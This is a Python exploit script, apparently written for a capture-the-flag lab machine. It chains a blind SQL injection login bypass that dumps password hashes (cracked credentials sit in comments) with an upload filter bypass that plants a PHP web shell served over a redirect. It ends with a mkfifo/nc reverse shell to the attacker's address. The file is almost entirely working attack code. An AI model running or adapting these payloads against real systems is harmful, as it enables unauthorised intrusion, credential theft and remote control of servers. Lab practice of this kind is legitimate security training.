import requests
import yasqlit as ya
import http.server
import socketserver
import threading
import subprocess
import re

bind = ('',80)
redirect = 'ftp://anonymous@10.10.14.9:21/shell.php'
# https://docs.python.org/3/library/http.server.html
class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
       self.send_response(301)
       print(f"[*] redirecting {redirect}")
       self.send_header('Location', redirect)
       self.end_headers()
    def log_request(self, code) -> None:
        super().log_request(code=code)
        print(f"{self.headers}", end='')

def ftpd():
    with socketserver.TCPServer(bind, Handler) as httpd:
        try:
            print(f'[+] started server @ {bind}')
            httpd.allow_reuse_address = True
            httpd.serve_forever()
        finally:
            httpd.socket.close()


def pPayload(payload):
    p = f"admin' AND ({payload})-- -"
    return p

def boolPredicate(res):
    return True if 'Wrong identification' in res.text else False


def pwn():

    t = ya.Transport(
        payloadProcessor=pPayload,
        predicate=boolPredicate,
        requestPath='req-login.txt'
    )
    # qry = 'select @@version'
    # ya.boolExfiltrate(t, qry,'mysql')

    # q = ya.templates['mysql']['select']['tables']
    # users
    # q = ya.templates['mysql']['select']['columns'].format(table='users')
    # ID, username, password, role
    # q = 'SELECT password FROM users'
    # admin, chris
    # 0e462096931906507119562988736854, d4ee02a22fc872e36d9e3751ba72ddc8:juggling
    # ya.boolExfiltrateList(t, q, 'mysql')
    # admin:240610708

    # RUN FTP SERVER WITH shell.php
    # python3 -m pyftpdlib -p21 -w
    ftp = threading.Thread(target=ftpd)
    ftp.daemon = True
    ftp.start()
    s = t.client.session
    s.post('http://10.10.10.73/login.php', {'username':'admin','password':'240610708'})
    res = s.post('http://10.10.10.73/upload.php', {'url':'http://10.10.14.9/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php.gif'})
    hit = re.findall('/var/www/html/(.*?);', res.text)[0]
    l = subprocess.Popen('nc -lvp 5555', shell=True)
    params = {'cmd':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.9 5555 >/tmp/f'}
    try:
        s.get(f'http://10.10.10.73/{hit}/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php', params=params, timeout=0.0001)
    except requests.exceptions.ReadTimeout:
        pass
    l.communicate()    

pwn()